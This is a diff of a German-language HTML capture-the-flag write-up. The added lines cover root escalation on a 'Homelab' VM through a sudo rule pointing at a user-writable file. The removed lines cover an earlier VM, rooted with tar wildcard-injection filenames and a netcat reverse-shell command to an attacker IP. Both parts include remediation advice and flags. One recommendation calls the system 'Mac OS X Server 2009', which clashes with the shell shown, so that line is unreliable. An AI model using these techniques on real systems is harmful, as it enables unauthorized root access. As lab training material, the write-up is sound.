+                Wir versuchen, unsere neue <code>deepseek</code>-Datei mit <code>sudo</code> auszuführen. Die ersten Versuche (<code>sudo /home/shinosawa/deepseek</code> und <code>sudo /home/shinosawa/deepseek -p</code>) schlagen mit "command not found" fehl. Dies liegt daran, dass unsere neu erstellte Datei noch nicht ausführbar ist.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">sudo /home/shinosawa/deepseek</span></div>
+                    <pre><span class="password">sudo: /home/shinosawa/deepseek: command not found</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">sudo /home/shinosawa/deepseek -p</span></div>
+                    <pre><span class="password">sudo: /home/shinosawa/deepseek: command not found</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>4. `deepseek` ausführbar machen und erfolgreiche Rechteausweitung:</strong>
+                Wir machen unsere neue <code>deepseek</code>-Datei mit <code>chmod +x deepseek</code> ausführbar.
+                Der anschließende Aufruf <code>sudo /home/shinosawa/deepseek -p</code> (der Parameter <code>-p</code> ist hier wahrscheinlich irrelevant, da unsere Datei nur <code>ash</code> enthält, aber aus Gewohnheit vom vorherigen Versuch übernommen) ist erfolgreich.
+                Wir erhalten einen neuen Prompt: <code>/home/shinosawa #</code>. Der <code>#</code> am Ende des Prompts ist ein starker Indikator für Root-Rechte.
+                Die Ausführung von <code>id</code> bestätigt dies: <code>uid=0(root) gid=0(root) groups=0(root)...</code>.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">chmod +x deepseek</span></div>
+                    <pre></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">sudo /home/shinosawa/deepseek -p</span></div>
+                    <pre>
+<span class="command">/home/shinosawa #</span> <span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span>
+</pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Erwartetes und erreichtes Ergebnis:</strong>
+                Durch das Ersetzen der Datei <code>/home/shinosawa/deepseek</code> durch ein Skript, das <code>ash</code> startet, und die anschließende Ausführung mit <code>sudo</code>, haben wir erfolgreich eine Shell mit Root-Rechten (UID 0) auf dem System <code>homelab</code> erlangt.
+            </p>
+            <p class="evaluation">
+                <strong>Risikobewertung:</strong>
+                Hoch. Diese Schwachstelle ermöglichte einem Benutzer mit niedrigen Rechten (<code>shinosawa</code>) die vollständige Übernahme des Systems mit Root-Privilegien. Ein Angreifer mit Root-Zugriff kann beliebige Befehle ausführen, Daten stehlen oder verändern, Malware installieren und das System als Ausgangspunkt für weitere Angriffe im Netzwerk nutzen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlungen zur Behebung:</strong>
+                <ul>
+                    <li>**<code>sudoers</code>-Konfiguration korrigieren:** Die Regel <code>shinosawa ALL=(ALL) NOPASSWD: /home/shinosawa/deepseek</code> muss sofort entfernt oder drastisch eingeschränkt werden. Wenn der Benutzer <code>shinosawa</code> tatsächlich einen bestimmten Befehl als Root ausführen muss, sollte dieser Befehl in einem geschützten Systemverzeichnis liegen (nicht im Home-Verzeichnis des Benutzers) und die <code>sudo</code>-Regel sollte so spezifisch wie möglich sein (z.B. genaue Argumente vorschreiben, <code>NOPASSWD</code> vermeiden, wenn möglich).</li>
+                    <li>**Prinzip der geringsten Rechte (Least Privilege):** Benutzern nur die minimal notwendigen Rechte gewähren.</li>
+                    <li>**Regelmäßige Überprüfung der <code>sudoers</code>-Datei:** Konfigurationen sollten regelmäßig auf unsichere Einträge überprüft werden.</li>
+                    <li>**Monitoring:** System-Logging sollte verdächtige <code>sudo</code>-Aktivitäten erfassen.</li>
+                </ul>
             </p>
         </section>
 
         <section id="privilege-escalation">
             <h2>Privilege Escalation</h2>
-            <p class="comment">
-                Wir überprüfen, welche sudo-Rechte der Benutzer "po" hat.
+            <p class="analysis"><strong>Analyse:</strong>
+                Nachdem wir im vorherigen Schritt durch Ausnutzung der fehlerhaften <code>sudo</code>-Konfiguration eine Root-Shell erlangt haben (bestätigt durch <code>id</code> mit <code>uid=0(root)</code>), versuchen wir nun, die Root-Flag zu finden und auszulesen. Standardmäßig befindet sich die Root-Flag oft im Home-Verzeichnis des Root-Benutzers (<code>/root/</code>) in einer Datei namens <code>root.flag</code> oder <code>root.txt</code>.
+                Wir führen den Befehl <code>cat ~/root.flag</code> aus. Das Tilde-Zeichen <code>~</code> expandiert in einer Root-Shell zum Home-Verzeichnis des Root-Benutzers, also <code>/root/</code>.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-root">/home/shinosawa # <span class="command">cat ~/root.flag</span></div>
+                    <pre><span class="password">flag{e3b081b8af1c7079049b029c7cb8bd0d}</span></pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Fantastisch, der Root-Zugriff war erfolgreich und wir haben unser Ziel erreicht! Die Root-Flag <code><span class="password">flag{e3b081b8af1c7079049b029c7cb8bd0d}</span></code> wurde erfolgreich im Home-Verzeichnis des Root-Benutzers gefunden und ausgelesen.
+                Damit ist die virtuelle Maschine "Homelab" vollständig kompromittiert.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Die Maschine ist gelöst. Es könnten noch weitere Post-Exploitation-Schritte durchgeführt werden (z.B. Suche nach weiteren sensitiven Daten, Persistenzmechanismen, etc.), aber im Rahmen eines CTFs ist das Finden der Root-Flag oft das Endziel. Alle gefundenen Schwachstellen und der Weg zur Kompromittierung sollten detailliert dokumentiert werden.
                 <br>
-                <b>Analyse:</b> Sudo ermöglicht es Benutzern, Befehle mit den Rechten eines anderen Benutzers auszuführen.
-                <br>
-                <b>Empfehlung:</b> Beschränken Sie die sudo-Rechte auf das absolute Minimum, das für die Aufgaben des Benutzers erforderlich ist.
-            </p>
-            <div class="code-block">
-                <div class="terminal">
-                    <div class="prompt">
-                        po@hostname:~$ <span class="command">sudo -l</span>
-                    </div>
-                </div>
-                <div class="terminal">
-We trust you have received the usual lecture from the local System<br>
-Administrator. It usually boils down to these three things:<br><br>
-    #1) Respect the privacy of others.<br>
-    #2) Think before you type.<br>
-    #3) With great power comes great responsibility.<br><br>
-[sudo] password for po:<br>
-Sorry, user po may not run sudo on hostname.
-                </div>
-            </div>
-            <p class="comment">
-                Der Benutzer "po" darf keine sudo-Befehle ausführen.
-            </p>
-
-            <div class="code-block">
-                <div class="terminal">
-                    <div class="prompt">
-                        po@hostname:~$ <span class="command">cat /etc/passwd | grep bash</span>
-                    </div>
-                </div>
-                <div class="terminal">
-root:x:0:0:root:/root:/bin/bash<br>
-po:x:1000:1000::/home/po:/bin/bash<br>
-oogway:x:1001:1001::/home/oogway:/bin/bash
-                </div>
-            </div>
-            <p class="comment">
-                Wir überprüfen die vorhandenen Benutzer mit einer Bash-Shell. Wir finden den Benutzer "oogway".
-            </p>
-
-            <div class="code-block">
-                <div class="terminal">
-                    <div class="prompt">
-                        po@hostname:~$ <span class="command">cat /etc/sudoers.d/po</span>
-                    </div>
-                </div>
-                <div class="terminal">
-po HackMyVM = (oogway) NPASSWD: /bin/bash
-                </div>
-            </div>
-            <p class="comment">
-                Der Benutzer "po" darf den Befehl /bin/bash als Benutzer "oogway" auf dem Host "HackMyVM" ohne Passwort ausführen.
-            </p>
-
-            <p class="comment">
-                Wir versuchen, den Befehl auszuführen.
-            </p>
-            <div class="code-block">
-                <div class="terminal">
-                    <div class="prompt">
-                        po@hostname:~$ <span class="command">sudo -u oogway -h HackMyVM /bin/bash</span>
-                    </div>
-                </div>
-                <div class="terminal">
-sudo: unable to resolve host HackMyVM: Name or service not known
-                </div>
-            </div>
-            <p class="comment">
-                Der Hostname "HackMyVM" kann nicht aufgelöst werden. Wir versuchen es ohne Hostname.
-            </p>
-
-            <div class="code-block">
-                <div class="terminal">
-                    <div class="prompt">
-                        po@hostname:~$ <span class="command">sudo -u oogway /bin/bash</span>
-                    </div>
-                </div>
-                <div class="terminal">
-oogway@hostname:/home/po$
-                </div>
-            </div>
-            <p class="comment">
-                Wir haben erfolgreich eine Shell als Benutzer "oogway" erhalten.
-            </p>
-
-            <div class="code-block">
-                <div class="terminal">
-                    <div class="prompt">
-                        oogway@hostname:~$ <span class="command">cat user.txt</span>
-                    </div>
-                </div>
-                <div class="terminal">
-081ecc5e6dd6ba0d150fc4bc0e62ec50
-                </div>
-            </div>
-            <p class="comment">
-                Wir haben die user.txt-Datei gelesen.
-            </p>
-
-            <div class="code-block">
-                <div class="terminal">
-                    <div class="prompt">
-                        oogway@hostname:~$ <span class="command">find / -name *.txt 2>/dev/null</span>
-                    </div>
-                </div>
-                <div class="terminal">
-/home/oogway/user.txt
-                </div>
-            </div>
-            <p class="comment">
-                Wir suchen nach weiteren Textdateien.
-            </p>
-
-            <div class="code-block">
-                <div class="terminal">
-                    <div class="prompt">
-                        oogway@hostname:~$ <span class="command">find / -writable 2>/dev/null</span>
-                    </div>
-                </div>
-                <div class="terminal">
-/home/oogway<br>
-/home/oogway/.bash_history<br>
-/home/oogway/.bash_logout<br>
-/home/oogway/.profile<br>
-/home/oogway/.bashrc<br>
-/home/po/.bash_history<br>
-/usr/lib/systemd/system/cryptdisks-early.service<br>
-/usr/lib/systemd/system/hwclock.service<br>
-/usr/lib/systemd/system/cryptdisks.service
-                </div>
-            </div>
-            <p class="comment">
-                Wir suchen nach beschreibbaren Dateien.
-            </p>
-
-            <div class="code-block">
-                <div class="terminal">
-                    <div class="prompt">
-                        oogway@hostname:/opt/secret$ <span class="command">grep -lir "/opt/secret" / 2>/dev/null</span>
-                    </div>
-                </div>
-                <div class="terminal">
-/etc/crontab
-                </div>
-            </div>
-            <p class="comment">
-                Wir suchen nach Dateien, die den Pfad "/opt/secret" enthalten.
-            </p>
-
-            <div class="code-block">
-                <div class="terminal">
-                    <div class="prompt">
-                        oogway@hostname:/opt/secret$ <span class="command">cat /etc/crontab</span>
-                    </div>
-                </div>
-                <div class="terminal">
-# /etc/crontab: system-wide crontab<br>
-# Unlike any other crontab you don't have to run the `crontab`<br>
-# command to install the new version when you edit this file<br>
-# and files in /etc/cron.d. These files also have username fields,<br>
-# that none of the other crontabs do.<br><br>
-SHELL=/bin/sh<br>
-PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br>
-# Example of job definition:<br>
-# .---------------- minute (0 - 59)<br>
-# |  .------------- hour (0 - 23)<br>
-# |  |  .---------- day of month (1 - 31)<br>
-# |  |  |  .------- month (1 - 12) (or jan,feb,mar,apr ...)<br>
-# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7)<br>
-# |  |  |  |  |<br>
-# *  *  *  *  * user-name command to be executed<br>
-*  *    * * *   root 	cd /opt/secret/ && tar -zcf /var/backups/secret.tgz *<br>
-17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly<br>
-25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )<br>
-47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )<br>
-52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
-                </div>
-            </div>
-            <p class="comment">
-                Die Datei /etc/crontab enthält einen Eintrag, der jede Minute ein Tar-Archiv des Verzeichnisses /opt/secret/ erstellt.
-            </p>
-
-            <p class="comment">
-                Wir nutzen die Cronjob-Schwachstelle aus, um Root-Rechte zu erlangen.
-            </p>
-            <div class="code-block">
-                <div class="terminal">
-                    <div class="prompt">
-                        oogway@hostname:/opt/secret$ <span class="command">touch -- --checkpoint=1</span>
-                    </div>
-                </div>
-            </div>
-            <div class="code-block">
-                <div class="terminal">
-                    <div class="prompt">
-                        oogway@hostname:/opt/secret$ <span class="command">touch -- "--checkpoint-action=exec=sh rs"</span>
-                    </div>
-                </div>
-            </div>
-            <div class="code-block">
-                <div class="terminal">
-                    <div class="prompt">
-                        oogway@hostname:/opt/secret$ <span class="command">echo "nc -e /bin/bash 192.168.2.153 80" >rs</span>
-                    </div>
-                </div>
-            </div>
-
-            <p class="comment">
-                Wir richten einen Netcat-Listener ein.
-            </p>
-            <div class="code-block">
-                <div class="terminal">
-                    <div class="prompt">
-                        ┌──(root㉿cyber)-[~]<br>
-                        └─# <span class="command">nc -lvnp 80</span>
-                    </div>
-                </div>
-            </div>
-
-            <p class="comment">
-                Wir erhalten eine Root-Shell.
-            </p>
-            <div class="code-block">
-                <div class="terminal">
-listening on [any] 80 ...<br>
-connect to [192.168.2.153] from (UNKNWN) [192.168.2.112] 41662<br>
-id<br>
-uid=0(root) gid=0(root) groups=0(root)<br>
-ls<br>
---checkpoint=1<br>
---checkpoint-action=exec=sh rs<br>
-rs<br>
-cd /root<br>
-cat root.txt<br>
-d5806296126a30ceebeaa172ff9c9151
-                </div>
-            </div>
-
-            <p class="comment">
-                <b>Analyse:</b> Wir haben erfolgreich Root-Rechte erlangt, indem wir eine Cronjob-Schwachstelle ausgenutzt haben.
-                <br>
-                <b>Empfehlung:</b> Überprüfen Sie regelmäßig die Cronjobs auf dem System und stellen Sie sicher, dass sie sicher konfiguriert sind.
+                <strong>Empfehlung (Admin):</strong>
+                Die unsichere <code>sudo</code>-Konfiguration, die zu dieser Root-Kompromittierung geführt hat, muss dringend behoben werden (siehe Empfehlungen im POC-Abschnitt). Zusätzlich sollten allgemeine Härtungsmaßnahmen auf dem System durchgeführt werden, darunter:
+                <ul>
+                    <li>Regelmäßige Sicherheitsupdates für das Betriebssystem und alle installierten Anwendungen.</li>
+                    <li>Überprüfung und Härtung aller Systemkonfigurationen.</li>
+                    <li>Implementierung von Intrusion Detection/Prevention Systems (IDS/IPS).</li>
+                    <li>Starke und einzigartige Passwörter für alle Konten, idealerweise mit MFA.</li>
+                    <li>Überprüfung aller Dateiberechtigungen.</li>
+                </ul>
+                Das System ist aufgrund seines Alters (Mac OS X Server 2009) und der gezeigten Schwachstellen als extrem unsicher einzustufen und sollte idealerweise komplett ersetzt werden.
             </p>
         </section>
 
         <section id="flags">
-            <h2>Flags</h2>
-            <div class="code-block">
-                <div class="terminal">
-                    cat root.txt<br>
-                    d5806296126a30ceebeaa172ff9c9151
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/shinosawa/user.flag</div>
+                    <div class="flag-value"><span class="password">flag{38665d1048af82499c6ecbd3c0db3acc}</span></div>
                 </div>
-            </div>
-            <div class="code-block">
-                <div class="terminal">
-                    cat user.txt<br>
-                    081ecc5e6dd6ba0d150fc4bc0e62ec50
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.flag</div>
+                    <div class="flag-value"><span class="password">flag{e3b081b8af1c7079049b029c7cb8bd0d}</span></div>
                 </div>
             </div>
         </section>
@@ -582,7 +1897,7 @@ d5806296126a30ceebeaa172ff9c9151
 
     <footer class="footer">
         <p>Ben Chehade - Cyber Security Reports</p>
-        <p>Berichtsdatum: 2024-01-09</p>
+        <p>Berichtsdatum: 14. Mai 2025</p>
     </footer>
 </body>
-</html>
+</html> 
